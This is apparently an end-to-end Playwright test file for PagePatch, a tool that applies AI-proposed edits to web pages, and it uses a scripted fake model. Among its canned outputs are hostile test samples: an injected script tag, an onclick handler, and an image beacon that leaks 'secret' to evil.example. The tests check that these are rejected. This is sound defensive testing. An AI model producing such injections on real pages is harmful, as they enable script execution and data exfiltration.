// End-to-end: runs the real PagePatch server in front of the static and React
// fixtures (copied to a temp folder so writes don't touch the repo), with a
// scripted model, and drives the injected overlay in headless Chromium.
//
// Run: pnpm --filter pagepatch build && pnpm --filter pagepatch test
// Locally this uses your installed Chrome (fresh temp profile); CI uses Playwright's Chromium.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { cp, mkdtemp, readFile, rm } from "node:fs/promises";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { extname, join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";
import { createServers } from "../src/server.ts";

const here = dirname(fileURLToPath(import.meta.url));
const repo = join(here, "..", "..");
const overlayJs = await readFile(join(here, "..", "dist", "overlay.js"), "utf8");
const panelJs = await readFile(join(here, "..", "dist", "panel.js"), "utf8");

let tmp, browser, page;
const servers = [];
const calls = [];   // model calls: { schemaName, messages }

function previewFor(text) {
  const t = text.toLowerCase();
  if (t.includes("two columns")) return { summary: "Two-column grid.", ops: [{ op: "setStyle", target: "pp0", styles: { display: "grid", "grid-template-columns": "1fr 1fr" } }] };
  if (t.includes("add a card")) return { summary: "Added a card.", ops: [{ op: "insert", parent: "pp0", index: 3, node: { tag: "article", attrs: [{ name: "class", value: "feature-card" }], children: [{ tag: "h3", text: "Offline mode" }] } }] };
  if (t.includes("remove the first")) return { summary: "Removed the first card.", ops: [{ op: "remove", target: "pp1" }] };
  if (t.includes("move offline")) return { summary: "Moved Offline first.", ops: [{ op: "move", target: "pp10", index: 0 }] };
  if (t.includes("hero title")) return { summary: "New hero title.", ops: [{ op: "setText", target: "pp1", text: "Notes your team will read" }] };
  if (t.includes("rename")) return { summary: "New heading.", ops: [{ op: "setText", target: "pp1", text: "Clear, honest pricing" }] };
  if (t.includes("evil")) return { summary: "x", ops: [{ op: "insert", parent: "pp0", index: 0, node: { tag: "script", text: "window.__pwned = 1" } }] };
  if (t.includes("handler")) return { summary: "x", ops: [{ op: "setAttr", target: "pp1", name: "onclick", value: "window.__pwned = 1" }] };
  if (t.includes("outside")) return { summary: "x", ops: [{ op: "setText", target: "pp999", text: "escaped" }] };
  if (t.includes("style attack")) return { summary: "x", ops: [{ op: "setText", target: "pp10", text: "body{display:none}" }] };
  if (t.includes("image beacon")) return { summary: "x", ops: [{ op: "insert", parent: "pp0", index: 0, node: { tag: "img", attrs: [{ name: "src", value: "https://evil.example/x.png?d=secret" }, { name: "alt", value: "" }] } }] };
  if (t.includes("href on heading")) return { summary: "x", ops: [{ op: "setAttr", target: "pp2", name: "href", value: "https://evil.example" }] };
  if (t.includes("position")) return { summary: "x", ops: [{ op: "setStyle", target: "pp0", styles: { position: "fixed", inset: "0" } }] };
  return { summary: "Nothing to change.", ops: [] };
}

async function model({ schemaName, messages }) {
  calls.push({ schemaName, messages });
  if (schemaName === "preview_ops") return previewFor(messages.at(-1).content.split("Request: ").at(-1));
  const prompt = messages.at(-1).content;
  if (prompt.includes('<file path="index.html">')) return { summary: "Two sections.", edits: [
    { path: "index.html", search: "<h1>Notes that keep up with your team</h1>", replace: "<h1>Notes your team will read</h1>" },
    { path: "styles.css", search: ".features {", replace: ".features {\n  display: grid;\n  grid-template-columns: 1fr 1fr;" },
  ] };
  return { summary: "Retitle pricing.", edits: [{ path: "src/components/Pricing.tsx", search: `<h2 className="pricing-title">Simple pricing</h2>`, replace: `<h2 className="pricing-title">Clear, honest pricing</h2>` }] };
}

function staticServer(dir) {
  return http.createServer(async (req, res) => {
    const path = new URL(req.url, "http://x").pathname;
    const file = join(dir, path === "/" ? "index.html" : path);
    try {
      const body = await readFile(file);
      res.writeHead(200, { "content-type": { ".html": "text/html", ".css": "text/css", ".js": "text/javascript" }[extname(file)] ?? "text/plain" });
      res.end(body);
    } catch { res.writeHead(404); res.end(); }
  });
}

const listen = (s, port) => new Promise((r) => { servers.push(s); s.listen(port, "127.0.0.1", r); });

async function start(name, root, servePort, ppPort) {
  await listen(staticServer(name === "react" ? join(root, "dist") : root), servePort);
  const s = createServers({ target: `http://127.0.0.1:${servePort}`, root, port: ppPort, panelPort: ppPort + 1, token: "e2e-token-0123456789", overlayJs, panelJs,
    settings: { provider: "claude-code", model: "sonnet", keys: {} }, available: { "claude-code": true, codex: true, anthropic: true, openai: true }, model: (_s, c) => model(c) });
  await listen(s.panel, ppPort + 1);
  await listen(s.proxy, ppPort);
}

before(async () => {
  execFileSync("pnpm", ["--filter", "@pagepatch/fixture-react", "build"], { cwd: repo, stdio: "ignore" });
  tmp = await mkdtemp(join(tmpdir(), "pp-e2e-"));
  await cp(join(repo, "fixtures/static"), join(tmp, "static"), { recursive: true });
  await cp(join(repo, "fixtures/react"), join(tmp, "react"), { recursive: true, filter: (s) => !s.includes("node_modules") });
  await start("static", join(tmp, "static"), 8790, 8791);
  await start("react", join(tmp, "react"), 8795, 8796);

  browser = await chromium.launch({ channel: process.env.CI ? "chromium" : "chrome", headless: true });
  page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
  // The overlay uses a closed shadow root; open it for Playwright's locators. Test-only.
  await page.addInitScript(() => {
    const orig = Element.prototype.attachShadow;
    Element.prototype.attachShadow = function (init) { return orig.call(this, { ...init, mode: "open" }); };
  });
});

after(async () => {
  await browser?.close();
  for (const s of servers) { s.closeAllConnections(); s.close(); }
  if (tmp) await rm(tmp, { recursive: true, force: true });
});

// The panel lives in a cross-origin iframe inside the overlay's shadow root.
const panel = () => page.frameLocator("pagepatch-overlay iframe");
const status = () => panel().locator("[role=status]");
const waitStatus = (text) => status().filter({ hasText: text }).waitFor();
const btn = (name) => panel().getByRole("button", { name, exact: true });
const launcher = () => page.locator("pagepatch-overlay").getByRole("button", { name: "PagePatch", exact: true });

async function pickAt(selector, dx = 4, dy = 4) {
  const box = await page.locator(selector).first().boundingBox();
  await page.mouse.move(box.x + dx, box.y + dy);
  await page.mouse.click(box.x + dx, box.y + dy);
}

async function hoverAt(selector) {
  const box = await page.locator(selector).first().boundingBox();
  await page.mouse.move(box.x + 4, box.y + 4);
}

async function send(text, expectStatus) {
  await panel().locator("textarea").fill(text);
  await btn("Send").click();
  await waitStatus(expectStatus);
}

async function applyPreview() {
  await btn("Apply preview").click();
  await waitStatus("Preview applied");
}

const selected = (text) => panel().locator("code").filter({ hasText: text }).waitFor();
const cards = () => page.$$eval(".features:not([style*='none']) h3", (els) => els.map((e) => e.textContent));
const lastPreview = () => calls.filter((c) => c.schemaName === "preview_ops").at(-1).messages.at(-1).content;

test("select, preview, follow up, undo, reset (static fixture)", async () => {
  await page.goto("http://127.0.0.1:8791/");
  await page.evaluate(() => { window.__orig = document.querySelector(".features"); });
  await launcher().click();
  await waitStatus("Click a section on the page");
  await pickAt(".features");
  await selected("section.features");

  await send("make it two columns", "Review the proposal");
  await applyPreview();
  const cols = await page.$eval(".features[data-pp-id]", (el) => getComputedStyle(el).gridTemplateColumns.split(" ").length);
  assert.equal(cols, 2);

  await send("add a card", "Review the proposal");
  await applyPreview();
  assert.deepEqual(await cards(), ["Fast capture", "Linked decisions", "Instant search", "Offline mode"]);
  assert.equal(await page.$$eval(".features[data-pp-id] .feature-card", (els) => els.length), 4);
  assert.match(lastPreview(), /data-pp-id="pp0"/);

  await send("remove the first card", "Review the proposal");
  await applyPreview();
  assert.deepEqual(await cards(), ["Linked decisions", "Instant search", "Offline mode"]);
  // Follow-ups see the current preview, including the inserted node
  assert.match(lastPreview(), /Offline mode/);

  await send("move offline first", "Review the proposal");
  await applyPreview();
  assert.deepEqual(await cards(), ["Offline mode", "Linked decisions", "Instant search"]);

  await btn("Undo").click();
  await waitStatus("Undid");
  assert.deepEqual(await cards(), ["Linked decisions", "Instant search", "Offline mode"]);

  await btn("Reset").click();
  await waitStatus("Reset");
  assert.deepEqual(await cards(), ["Fast capture", "Linked decisions", "Instant search"]);
  assert.equal(await page.evaluate(() => document.querySelector(".features") === window.__orig && !window.__orig.hasAttribute("style")), true);
  assert.equal(await page.$$eval("[data-pp-id]", (els) => els.length), 0, "no preview nodes left behind");
});

test("unsafe model output never reaches the page", async () => {
  // Each one is stopped by the server's validator or, failing that, by the overlay's own checks.
  const layers = {};
  for (const text of ["evil", "handler", "outside", "position", "style attack", "image beacon", "href on heading"]) {
    const before = await page.$eval("main", (m) => m.innerHTML);
    await panel().locator("textarea").fill(text);
    await btn("Send").click();
    await panel().locator("main:not([aria-busy])").waitFor();
    if (/Review the proposal/.test(await status().textContent())) {
      await btn("Apply preview").click();
      await waitStatus("Rejected unsafe change");
      layers[text] = "overlay";
    } else layers[text] = "server";
    assert.equal(await page.$eval("main", (m) => m.innerHTML), before, `${text}: page changed`);
  }
  assert.ok(Object.values(layers).includes("overlay"), "overlay validation is exercised");
  assert.equal(await page.evaluate(() => window.__pwned), undefined);
  assert.equal(await page.$$eval("main script", (s) => s.length), 0);
});

test("snapshots omit form values, hidden inputs, and URL query strings", async () => {
  await btn("Select again").click();
  await pickAt(".signup");
  await selected("section.signup");
  await send("tighten this", "No change proposed");
  assert.doesNotMatch(lastPreview(), /private@example\.com|confidential draft|hidden-csrf-token/);
  assert.match(lastPreview(), /<input [^>]*type="email"/);

  await btn("Select again").click();
  await pickAt(".hero");
  await selected("section#hero.hero");
  await send("tighten this", "No change proposed");
  assert.match(lastPreview(), /href="\/signup"/);
  assert.doesNotMatch(lastPreview(), /secret123|plan=pro|utm_source/);
});

test("↑ and Esc work while focus is in the panel", async () => {
  const hoverTag = () => page.evaluate(() => document.querySelector("pagepatch-overlay").shadowRoot.querySelectorAll("div")[1].textContent);
  await btn("Select again").click();   // focus is now inside the panel iframe
  await waitStatus("Click a section");
  const box = await page.locator(".feature-card h3").first().boundingBox();
  await page.mouse.move(box.x + 4, box.y + 4);
  assert.equal(await hoverTag(), "h3");
  await page.keyboard.press("ArrowUp");
  await page.keyboard.press("ArrowUp");
  // Forwarded over postMessage, so poll.
  await page.waitForFunction(() => document.querySelector("pagepatch-overlay").shadowRoot.querySelectorAll("div")[1].textContent === "section.features", null, { timeout: 5000 });
  await page.mouse.down();   // click without moving, so the grown selection is kept
  await page.mouse.up();
  await selected("section.features");

  await btn("Select again").click();
  await waitStatus("Click a section");
  await page.keyboard.press("Escape");
  await waitStatus("Selection cancelled");
});

test("changes to several sections stay, resume on click, and go into one patch", async () => {
  await page.reload();   // fresh page; the panel reopens from sessionStorage
  await waitStatus("Click Select again");
  await btn("Select again").click();
  await waitStatus("Click a section");
  await pickAt(".features");
  await selected("section.features");
  await send("make it two columns", "Review the proposal");
  await applyPreview();

  await btn("Select again").click();
  await waitStatus("Click a section");
  await hoverAt(".hero h1");
  await page.keyboard.press("ArrowUp");
  await page.waitForFunction(() => document.querySelector("pagepatch-overlay").shadowRoot.querySelectorAll("div")[1].textContent === "section#hero.hero");
  await page.mouse.down(); await page.mouse.up();
  await selected("section#hero.hero");
  // The features preview is still on the page.
  assert.equal(await page.$eval(".features[data-pp-id]", (el) => getComputedStyle(el).gridTemplateColumns.split(" ").length), 2);
  await send("change the hero title", "Review the proposal");
  await applyPreview();
  assert.equal(await page.locator(".hero[data-pp-id] h1").textContent(), "Notes your team will read");
  await panel().getByText("Changed: section.features, section#hero.hero").waitFor();

  // Clicking inside a changed section picks its conversation back up.
  await btn("Select again").click();
  await waitStatus("Click a section");
  await pickAt(".features[data-pp-id] h3");
  await waitStatus("Picking up where you left off");
  await panel().getByText("make it two columns").waitFor();

  // A selection that would swallow a changed section is refused.
  await btn("Select again").click();
  await waitStatus("Click a section");
  await hoverAt(".hero[data-pp-id] h1");
  await page.keyboard.press("ArrowUp");
  await page.keyboard.press("ArrowUp");   // h1 -> hero -> main, which contains both changed sections
  await page.waitForFunction(() => document.querySelector("pagepatch-overlay").shadowRoot.querySelectorAll("div")[1].textContent === "main");
  await page.mouse.down(); await page.mouse.up();
  await waitStatus("which you already changed");

  // One patch for both sections.
  await btn("Generate source patch").click();
  await waitStatus("Review the diff");
  const sent = calls.at(-1).messages.at(-1).content;
  assert.match(sent, /label="section.features"[\s\S]*label="section#hero.hero"/);
  assert.match(await panel().locator("pre").textContent(), /\+\s+<h1>Notes your team will read<\/h1>/);
  await btn("Write to files").click();
  await waitStatus("Wrote");
  assert.match(await readFile(join(tmp, "static/index.html"), "utf8"), /Notes your team will read/);
  assert.match(await readFile(join(tmp, "static/styles.css"), "utf8"), /grid-template-columns: 1fr 1fr/);
  assert.equal(await page.$$eval("[data-pp-id]", (els) => els.length), 0, "all previews dropped after writing");
});

test("page scripts can't reach the panel, its token, or the API", async () => {
  const r = await page.evaluate(async () => {
    const host = document.querySelector("pagepatch-overlay");
    const frame = host.shadowRoot.querySelector("iframe");   // open only because of the test's init script
    let doc = "readable";
    try { void frame.contentDocument.body; doc = frame.contentDocument ? "readable" : "blocked"; } catch { doc = "blocked"; }
    const html = document.documentElement.outerHTML;
    let api = "reachable";
    try {
      await fetch("http://127.0.0.1:8792/api/apply", { method: "POST", headers: { "content-type": "application/json", "x-pagepatch-token": "guess" }, body: "{}" });
    } catch { api = "blocked"; }
    return { doc, tokenInPage: html.includes("e2e-token-0123456789"), api };
  });
  assert.deepEqual(r, { doc: "blocked", tokenInPage: false, api: "blocked" });
});

test("Close restores the page", async () => {
  await btn("Close").click();
  await launcher().waitFor();
  assert.equal(await page.evaluate(() => document.documentElement.style.marginRight), "");
});

test("React fixture: preview, stale selection, then diff and write to disk", async () => {
  await page.goto("http://127.0.0.1:8796/");
  await launcher().click();
  await pickAt(".pricing");
  await selected("section.pricing");
  await send("rename the heading", "Review the proposal");
  await applyPreview();
  assert.equal(await page.locator(".pricing-title:visible").textContent(), "Clear, honest pricing");

  // A framework re-render replaces the selected node -> prompt to reselect; React keeps working.
  await page.locator("button.rerender").click();
  await waitStatus("replaced the selected section");
  assert.equal(await page.locator(".pricing").count(), 1, "preview clone removed, React's new node remains");
  assert.equal(await page.locator(".pricing-title").textContent(), "Simple pricing");

  await btn("Select again").click();
  await pickAt(".pricing");
  await selected("section.pricing");
  await send("rename the heading", "Review the proposal");
  await applyPreview();

  await btn("Generate source patch").click();
  await waitStatus("Review the diff");
  assert.match(await panel().locator("pre").textContent(), /\+\s+<h2 className="pricing-title">Clear, honest pricing<\/h2>/);
  const file = join(tmp, "react/src/components/Pricing.tsx");
  assert.match(await readFile(file, "utf8"), /Simple pricing/, "nothing written before approval");
  const sent = calls.at(-1).messages.at(-1).content;
  assert.match(sent, /<file path="src\/components\/Pricing.tsx">/);

  await btn("Write to files").click();
  await waitStatus("Wrote src/components/Pricing.tsx");
  assert.match(await readFile(file, "utf8"), /Clear, honest pricing/);
  assert.equal(await page.$$eval("[data-pp-id]", (els) => els.length), 0, "preview dropped after writing");
});
